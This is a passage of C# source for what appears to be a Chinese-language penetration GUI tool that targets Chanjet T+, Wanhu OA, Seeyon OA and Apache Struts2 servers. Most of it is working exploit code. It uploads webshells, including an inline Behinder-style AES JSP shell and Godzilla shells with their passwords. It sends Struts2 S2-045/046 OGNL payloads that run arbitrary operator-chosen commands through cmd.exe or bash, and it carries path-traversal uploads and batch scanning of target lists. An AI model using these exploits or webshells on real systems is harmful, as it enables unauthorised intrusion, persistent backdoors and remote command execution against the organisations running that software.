            var url = textBox19.Text + "/tplus/SM/SetupAccount/Upload.aspx?preload=1";
            var formData = new MultipartFormDataContent();
            var fileContent = new ByteArrayContent(File.ReadAllBytes("8.aspx.cdcab7d2.compiled"));
            fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
            formData.Add(fileContent, "File1", "../../../bin/8.aspx.cdcab7d2.compiled");
            var response = await httpClient.PostAsync(url, formData);
            response.EnsureSuccessStatusCode();
            String responseBody = await response.Content.ReadAsStringAsync();
            richTextBox10.AppendText("正在上传（一）内置预编译文件...." + Environment.NewLine);

        }

        private async void button19_Click(object sender, EventArgs e)
        {
            yz();
            yz1();
            var httpClient = new HttpClient();
            var url = textBox19.Text + "/tplus/SM/SetupAccount/Upload.aspx?preload=1";
            var formData = new MultipartFormDataContent();
            var fileContent = new ByteArrayContent(File.ReadAllBytes("8.aspx"));
            fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
            formData.Add(fileContent, "File1", "8.aspx");
            var response = await httpClient.PostAsync(url, formData);
            response.EnsureSuccessStatusCode();
            String responseBody = await response.Content.ReadAsStringAsync();
            richTextBox10.AppendText("上传成功" + "/tplus/8.aspx?preload=1" + "哥斯拉密码:pass" + Environment.NewLine);
        }

        private void button20_Click(object sender, EventArgs e)
        {
            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
            String url = textBox20.Text;



            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "GET";

            //  req.ContentType = "application/x-www-form-urlencoded;charset=UTF-8";

            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
            HttpWebResponse response = (HttpWebResponse)req.GetResponse();  //发送请求
            Stream stream = response.GetResponseStream(); //接收请求
            StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
            String server = response.Headers["server"];
            string s = reader.ReadToEnd();  //字符串S读取接收结果
            if (server.Contains("Apache"))
            {
                richTextBox11.AppendText("[" + server + "]");



            }
            else
            {
                {

                    richTextBox11.AppendText("[" + server + "]");
                }
            }
        }

        private void button21_Click(object sender, EventArgs e)
        {

            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;

            string dictionaryPath = "zw.txt";
            string[] urls = File.ReadAllLines(dictionaryPath);


            //    foreach (String url in urls)
            //     {



            Task[] tasks = new Task[urls.Length];
            for (int i = 0; i < urls.Length; i++)
            {

                String urla = urls[i];
                tasks[i] = Task.Run(() =>
                {




                    String urlss = urla;
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlss);
                    request.Method = "GET";
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    //  request.Accept = "*/*";
                    //     request.ContentType = "application/json";

                    //    request.Headers.Add("Sec-Fetch-Dest", "document");
                    //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                    //    request.Headers.Add("Sec-Fetch-Site", "none");
                    //    request.Headers.Add("Sec-Fetch-User", "?1");
                    //   request.Headers.Add("cmd", "whoami");

                    //    String postid = "\r\n{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://" + textBox11.Text + ":1389/TomcatBypass/TomcatEcho\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"}";
                    //     StreamWriter ss = new StreamWriter(request.GetRequestStream());  //请求我们的postid =参数数据
                    //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                    //   request.ContentLength = postData.Length;
                    //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                    //       ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                    //        byte[] byte1 = encoding.GetBytes(xmlData);
                    //      request.ContentLength = byte1.Length;

                    //    ss.Write(postid);
                    //     ss.Close();

                    //  req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                    Stream stream = response.GetResponseStream(); //接收请求
                    StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                    String server = response.Headers["server"];
                    string s = reader.ReadToEnd();  //字符串S读取接收结果
                    if (server.Contains("Apache"))
                    {
                        richTextBox11.AppendText(urla + "[" + server + "]" + Environment.NewLine);



                    }
                    else
                    {
                        {

                            richTextBox11.AppendText(urla + "[" + server + "]" + Environment.NewLine);
                        }
                    }














                });



            }
        }

        private void button22_Click(object sender, EventArgs e)
        {




            try
            {



                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox21.Text + "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp";



                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "GET";

                //  req.ContentType = "application/x-www-form-urlencoded;charset=UTF-8";

                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                HttpWebResponse response = (HttpWebResponse)req.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                                                                                           //String server = response.Headers["server"];
                string s = reader.ReadToEnd();  //字符串S读取接收结果
                if (s == "DBSTEP V3.0 0 14 0 请使用Post方法")
                {

                    richTextBox12.AppendText("存在万户OA OfficeServer.jsp 任意文件上传漏洞");
                }
                else if (s == "对不起，未登录请求，系统无法响应！/public/iWebOfficeSign/OfficeServer.jsp" && s == "Illegal users" && s == "Sorry, Page Not Found")
                {

                    richTextBox12.AppendText("不存在万户OA OfficeServer.jsp 任意文件上传漏洞");
                }
                {




                }


            }

            catch (Exception ex)
            {
                //       richTextBox12.AppendText("访问异常");

            }

        }
        public void yz2()
        {

            try
            {




                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox21.Text + "/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&";



                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "GET";

                //  req.ContentType = "application/x-www-form-urlencoded;charset=UTF-8";

                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                HttpWebResponse response = (HttpWebResponse)req.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                string s = reader.ReadToEnd();  //字符串S读取接收结果
                HttpStatusCode statusCode = response.StatusCode;
                if (s.Contains("上传附件"))
                {

                    richTextBox12.AppendText("[!]存在万户OA smartUpload.jsp 任意文件上传漏洞" + Environment.NewLine);
                }
                else
                {

                    richTextBox12.AppendText("不存在万户OA smartUpload.jsp 任意文件上传漏洞" + Environment.NewLine);
                }









                //       if (statusCode == HttpStatusCode.Found)
                {
                    //          {

                    //         string sss = response.Headers["Location"];
                    ///        HttpWebRequest req1 = (HttpWebRequest)WebRequest.Create(s);
                    //        HttpWebResponse re2 = (HttpWebResponse)req1.GetResponse();
                    //       if (statusCode == HttpStatusCode.OK)


                    //       richTextBox12.AppendText("不存在万户OA smartUpload.jsp 任意文件上传漏洞" + Environment.NewLine);
                    //





                    //richTextBox12.AppendText("不存在万户OA smartUpload.jsp 任意文件上传漏洞" + Environment.NewLine);
                }


            }
            catch (Exception ex)
            {
                // richTextBox12.AppendText("[!]存在万户OA smartUpload.jsp 任意文件上传漏洞");

            }
        }

        public async void yz6()
        {
            try
            {
                Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
                string url = textBox21.Text + "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "POST";
                request.UserAgent = "Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                request.Headers.Add("Accept-Language", "zh-CN,zh;q=0.9");
                request.Headers.Add("Connection", "close");
                request.Headers.Add("Cache-Control", "no-cache");
                request.Headers.Add("Pragma", "no-cache");
                request.Headers.Add("gzip", "deflate");
                request.ContentType = "application/octet-stream";
                string postData = "DBSTEP V3.0     170              0                1000              DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\nRECORDID=\r\nisDoc=dHJ1ZQ==\r\nmoduleType=Z292ZG9jdW1lbnQ=\r\nFILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw\r\n111111111111111111111111111111111111111111111111\r\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>";
                byte[] postDataBytes = Encoding.UTF8.GetBytes(postData);
                request.ContentLength = postDataBytes.Length;
                Stream requestStream = request.GetRequestStream();
                requestStream.Write(postDataBytes, 0, postDataBytes.Length);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                StreamReader reader = new StreamReader(response.GetResponseStream());
                string responseText = reader.ReadToEnd();
                if (responseText.Contains("DBSTEP"))
                {
                    richTextBox12.AppendText("上传成功" + "/defaultroot/public/edit/cmd_test.jsp" + "冰蝎aes加密" + Environment.NewLine);
                }
                else if (responseText.Contains("显示详细信息:"))
                {

                    richTextBox12.AppendText("漏洞利用失败" + "" + Environment.NewLine);

                }


            }

            catch (Exception ex)
            {

                richTextBox12.AppendText("上传失败" + "" + Environment.NewLine);
            }

        }
        public async void yz3()
        {


            try
            {


                //    Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                string url = textBox21.Text + "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                request.Headers.Add("Accept-Language", "zh-CN,zh;q=0.9");
                request.Headers.Add("Connection", "close");
                request.Headers.Add("Cache-Control", "no-cache");
                request.Headers.Add("Pragma", "no-cache");
                //    request.ContentType = "application/x-www-form-urlencoded";
                //  request.Headers.Add("x-forwarded-for", "127.0.0.1");
                //     request.Headers.Add("x-originating-ip", "127.0.0.1");
                // request.Headers.Add("x-remote-ip", "127.0.0.1");
                //   request.Headers.Add("x-remote-addr", "127.0.0.1");

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                string s = reader.ReadToEnd();  //字符串S读取接收结果

                if (s.Contains("DBSTEP"))
                {
                    richTextBox12.AppendText("[!]存在万户OfficeServer.jsp上传漏洞" + Environment.NewLine);
                    yz6();
                    // richTextBox7.AppendText("上传成功" + "/defaultroot/public/edit/cmd_test.jsp" + "冰蝎aes加密" + Environment.NewLine);
                }
                else
                {
                    richTextBox12.AppendText("不存在万户OfficeServer.jsp上传漏洞" + Environment.NewLine);

                }


                {


                }
            }
            catch (Exception ex)
            {


            }

        }




        private async void button23_Click(object sender, EventArgs e)
        {
            try
            {
                yz2();
                yz3();
                var httpClient = new HttpClient();
                var url = textBox21.Text + "/defaultroot/upload/fileUpload.controller";
                var formData = new MultipartFormDataContent();
                var fileContent = new ByteArrayContent(File.ReadAllBytes("xx.jsp"));
                fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
                formData.Add(fileContent, "file", "xx.jsp");
                var response = await httpClient.PostAsync(url, formData);
                response.EnsureSuccessStatusCode();
                String responseBody = await response.Content.ReadAsStringAsync();
                JObject jobj = JObject.Parse(responseBody);
                textBox3.Text = jobj["data"].ToString();

                if (textBox3.Text != "")
                {

                    richTextBox12.AppendText("[!]存在万户OA fileUpload.controller 任意文件上传漏洞" + "/defaultroot/upload/html/" + jobj["data"].ToString() + "哥斯拉密码:pwd" + Environment.NewLine);
                }
                else

                {

                    richTextBox12.AppendText("不存在万户OA fileUpload.controller 任意文件上传漏洞" + Environment.NewLine);
                }
            }

            catch (Exception ex)
            {

                richTextBox12.AppendText("不存在万户OA fileUpload.controller 任意文件上传漏洞" + Environment.NewLine);
            }


        }
        private void tabPage7_Click(object sender, EventArgs e)
        {

        }

        private void tabPage8_Click(object sender, EventArgs e)
        {

        }

        public void Struts046()
        {



            try
            {



                string filePath = "xl1.jsp";
                string uploadUrl = textBox23.Text;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                request.Method = "POST";
                request.ContentType = "multipart/form-data; boundary=---------------------------8db86cc218de63f";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                  "Content-Disposition: form-data; name=\"fileUploader\"; filename=\"s.%{(#dm=@\u006fgnl.OgnlC\u006fntext@DEF\u0041ULT_MEMBER_\u0041CCESS).(#_member\u0041ccess?(#_member\u0041ccess=#dm):((#c\u006fntainer=#c\u006fntext['c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u0041cti\u006fnC\u006fntext.c\u006fntainer']).(#\u006fgnlUtil=#c\u006fntainer.getInstance(@c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u006fgnl.OgnlUtil@class)).(#\u006fgnlUtil.getExcludedPackageNames().clear()).(#\u006fgnlUtil.getExcludedClasses().clear()).(#c\u006fntext.setMember\u0041ccess(#dm)))).(#r\u006fs=(@\u006frg.apache.struts2.Servlet\u0041cti\u006fnC\u006fntext@getResp\u006fnse().getWriter())).(#r\u006fs.print(3*222)).(#r\u006fs.flush()).(#r\u006fs.cl\u006fse())}\0b\"\r\n" +
                                  "Content-Type: application/octet-stream\r\n\r\n";

                //    String encode = Uri.EscapeDataString(formDataTemplate.Replace("123", ""));
                long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                request.ContentLength = formDataLength;
                Stream requestStream = request.GetRequestStream();
                byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                requestStream.Write(fileBytes, 0, fileBytes.Length);
                byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                requestStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream responseStream = response.GetResponseStream();
                //  String moab = formDataTemplate.Substring(0, formDataTemplate.IndexOf(".b", StringComparison.InvariantCultureIgnoreCase) + 1);
                StreamReader reader = new StreamReader(responseStream);
                //   string sss = response.Headers["X-Test"];
                //    if (sss.Contains("100"))
                string s = reader.ReadToEnd();
                if (s == "666")
                {

                    richTextBox13.AppendText("[!]存在Struts046命令执行漏洞" + Environment.NewLine);
                    button25.Enabled = true;
                }



                else
                {

                    richTextBox13.AppendText("不存在Struts046命令执行漏洞" + Environment.NewLine);
                    button25.Enabled = false;
                }

            }

            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }


        }
        private void button24_Click(object sender, EventArgs e)
        {


            try
            {

                Struts046();
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox23.Text;  //等于输入的IP域名

                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST"; //POST请求
                req.ContentType = "mmultipart/form-dataa%{(#dm=@\u006fgnl.OgnlC\u006fntext@DEF\u0041ULT_MEMBER_\u0041CCESS).(#_member\u0041ccess?(#_member\u0041ccess=#dm):((#c\u006fntainer=#c\u006fntext['c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u0041cti\u006fnC\u006fntext.c\u006fntainer']).(#\u006fgnlUtil=#c\u006fntainer.getInstance(@c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u006fgnl.OgnlUtil@class)).(#\u006fgnlUtil.getExcludedPackageNames().clear()).(#\u006fgnlUtil.getExcludedClasses().clear()).(#c\u006fntext.setMember\u0041ccess(#dm)))).(#r\u006fs=(@\u006frg.apache.struts2.Servlet\u0041cti\u006fnC\u006fntext@getResp\u006fnse().getWriter())).(#r\u006fs.print(3363*23163)).(#r\u006fs.flush()).(#r\u006fs.cl\u006fse())}";
                req.Headers.Add("Cache-Control", "no-cache");
                req.Headers.Add("Cache-Control", "no-cache");
                req.Headers.Add("Pragma", "no-cache");
                req.Accept = "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2";
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                //   String postid ="";  //变量POSTID就等于我们输入的内容+payload

                //     byte[] postDataBytes = Encoding.UTF8.GetBytes(postid);
                //     req.ContentLength = postDataBytes.Length;
                //     StreamWriter ss = new StreamWriter(req.GetRequestStream());  //请求我们的postid =参数数据
                //     ss.Write(postid);
                //      ss.Flush();
                HttpWebResponse response = (HttpWebResponse)req.GetResponse();

                Stream getStream = response.GetResponseStream();
                StreamReader streamreader = new StreamReader(getStream);
                string ss1 = streamreader.ReadToEnd();

                if (ss1 == "77897169")
                {

                    richTextBox13.AppendText("[!]存在struts045命令执行漏洞" + Environment.NewLine);
                    button25.Enabled = true;

                }
                else
                {

                    richTextBox13.AppendText("不存在struts045命令执行漏洞" + Environment.NewLine);
                    button25.Enabled = false;
                }

            }
            catch (Exception ex)
            {

                MessageBox.Show(ex.Message);
            }

        }

        private void tabPage12_Click(object sender, EventArgs e)
        {

        }
        public void Struts46()
        {


            try
            {

                string filePath = "xl.jsp";
                string uploadUrl = textBox23.Text;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                request.Method = "POST";
                request.ContentType = "multipart/form-data; boundary=---------------------------8db86cc218de63f";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                  "Content-Disposition: form-data; name=\"fileUploader\"; filename=\"%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'" + textBox24.Text + "').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b\"\r\n" +
                                  "Content-Type: application/octet-stream\r\n\r\n";

                //    String encode = Uri.EscapeDataString(formDataTemplate.Replace("123", ""));
                long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                request.ContentLength = formDataLength;
                Stream requestStream = request.GetRequestStream();
                byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                requestStream.Write(fileBytes, 0, fileBytes.Length);
                byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                requestStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream responseStream = response.GetResponseStream();
                //  String moab = formDataTemplate.Substring(0, formDataTemplate.IndexOf(".b", StringComparison.InvariantCultureIgnoreCase) + 1);
                StreamReader reader = new StreamReader(responseStream);

                richTextBox13.Text = reader.ReadToEnd();



                //      richTextBox13.AppendText("存在struts046命令执行漏洞" + Environment.NewLine);
                //     }
                //      else
                //   {

                //       richTextBox14.AppendText("不存在struts046命令执行漏洞" + Environment.NewLine);
                //    }




            }

            catch (Exception ex)
            {

                MessageBox.Show(ex.Message);
            }

        }
        private void button25_Click(object sender, EventArgs e)
        {


            if (comboBox1.Text.Trim() == "struts046")
            {
                {


                    Struts46();



                }

            }
            if (comboBox1.Text.Trim() == "struts045")
            {

                {
                    try
                    {
                        ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                        String url = textBox23.Text;  //等于输入的IP域名

                        HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                        req.Method = "POST"; //POST请求
                        req.ContentType = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + textBox24.Text + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
                        req.Headers.Add("Cache-Control", "no-cache");
                        req.Headers.Add("Cache-Control", "no-cache");
                        req.Headers.Add("Pragma", "no-cache");
                        req.Accept = "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2";
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                        //      req.Headers.Add("Cache-Control", "no-cache");
                        //      req.Headers.Add("Cache-Control", "no-cache");
                        //     req.Headers.Add("Pragma", "no-cache");
                        //     req.Accept = "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2";
                        //      req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                        //     String postid = "";  //变量POSTID就等于我们输入的内容+payload

                        //   byte[] postDataBytes = Encoding.UTF8.GetBytes(postid);
                        //   req.ContentLength = postDataBytes.Length;
                        //   StreamWriter ss = new StreamWriter(req.GetRequestStream());  //请求我们的postid =参数数据
                        //   ss.Write(postid);
                        //       ss.Flush();
                        HttpWebResponse response = (HttpWebResponse)req.GetResponse();

                        Stream getStream = response.GetResponseStream();
                        StreamReader streamreader = new StreamReader(getStream);
                        richTextBox13.Text = streamreader.ReadToEnd();



                    }
                    catch (Exception ex)
                    {

                    }

                }




                //默认执行struts045

            }
        }


        private void richTextBox13_TextChanged(object sender, EventArgs e)
        {

        }

        private void tabPage11_Click(object sender, EventArgs e)
        {

        }

        private void textBox27_TextChanged(object sender, EventArgs e)
        {

        }

        private void button26_Click(object sender, EventArgs e)
        {
        }

        private void 设置代理ToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            Form2 f = new Form2();
            f.Show();
        }

        private void 关于作者ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form3 f = new Form3();
            f.Show();
        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void 打开集成化ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form4 f = new Form4();
            f.Show();
        }

        private void tabPage15_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox9_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox7_TextChanged(object sender, EventArgs e)
        {

        }

        private void label26_Click(object sender, EventArgs e)
        {

        }

        // 泛微漏洞批量检测按钮点击事件响应函数
        private void button26_Click_1(object sender, EventArgs e)
        {
            // 每次批量检测前先清空界面上的显示
            richTextBox_weaverAllCheck.Clear();
            // 获取泛微漏洞批量检测的目标并显示到界面上
            List<string> targets = new List<string>();
            targets = parseTargets(textBox_weaverAllCheck, richTextBox_weaverAllCheck);
            // 判断 targets 是否为空、为空就说明出现了异常那就不可能进行批量检测
            if (targets == null)
            {
                return;
            }
            // 如果成功获取到目标则进行批量检测
            if (loadTargetsInfo(targets, richTextBox_weaverAllCheck))
            {
                // 用 poc 批量检测所有泛微的漏洞
                weaverAllCheck(targets, richTextBox_weaverAllCheck);
            }
        }


        private void tabPage10_Click(object sender, EventArgs e)
        {

        }

        private void button27_Click(object sender, EventArgs e)
        {

        }

        private void textBox18_TextChanged(object sender, EventArgs e)
        {

        }

        // 泛微漏洞文件上传攻击利用按键响应函数
        private void button29_Click(object sender, EventArgs e)
        {
            // 每次批量检测前先清空界面上的显示
            richTextBox_weaverUpAttack.Clear();
            // 获取泛微漏洞批量检测的目标并显示到界面上
            List<string> targets = new List<string>();
            targets = parseTargets(textBox_weaverUpAttack, richTextBox_weaverUpAttack);
            // 判断 targets 是否为空、为空就说明出现了异常那就不可能进行批量检测
            if (targets == null)
            {
                return;
            }
            // 如果成功获取到目标则进行批量上传
            if (loadTargetsInfo(targets, richTextBox_weaverUpAttack))
            {
                // 批量利用泛微的上传漏洞
                Weaver_ExpUpload_All(targets, richTextBox_weaverUpAttack);
            }
        }

        private void comboBox_weaverUpAttack_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox_weaverUpAttack.SelectedItem != null)
            {
                string selectedValue = comboBox_weaverUpAttack.SelectedItem.ToString();
                // 在这里处理选中的值
            }
        }

        private void textBox_weaverUpAttack_TextChanged(object sender, EventArgs e)
        {

        }

        public void aaa1()
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox15.Text + "/seeyon/management/status.jsp";
                HttpClientHandler handler = new HttpClientHandler();
                handler.AllowAutoRedirect = false;
                using (var httpclient = new HttpClient(handler))
                {
                    var ss = new HttpRequestMessage(HttpMethod.Get, url);
                    var sss = httpclient.SendAsync(ss).Result;
                    if (sss.StatusCode == HttpStatusCode.OK)
                    {
                        //  String ssss = sss.Content.ReadAsStringAsync().Result;
                        richTextBox7.AppendText("存在致远U8 getSessionList.jsp Session泄漏漏洞" + Environment.NewLine);
                    }
                    else if (sss.StatusCode == HttpStatusCode.Found)
                    {

                        richTextBox7.AppendText("不存在致远U8 getSessionList.jsp Session泄漏漏洞" + Environment.NewLine);
                    }

                }
            }
            catch (Exception ex)
            {
                //   richTextBox7.AppendText("不存在致远U8 getSessionList.jsp Session泄漏漏洞 + Environment.NewLine");
            }



        }
        public void df()
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                string url = textBox15.Text + "/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET"; //get请求方法
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                string s = reader.ReadToEnd();  //字符串S读取接收结果
                                                //      HttpStatusCode statusCode = response.StatusCode;
                if (s != "")
                {
                    richTextBox7.AppendText("[!]存在致远OA帆软ReportServer目录遍历漏洞" + "\n" + "/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true" + Environment.NewLine);

                }
                else
                {
                    richTextBox7.AppendText("不存在致远OA帆软ReportServer目录遍历漏洞" + Environment.NewLine);
                }
            }
            catch (Exception ex)
            {
                richTextBox7.AppendText("不存在致远OA帆软ReportServer目录遍历漏洞" + Environment.NewLine);
            }
        }
        public void df1()
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox15.Text + "/esn_mobile_pns/service/userTokenService";
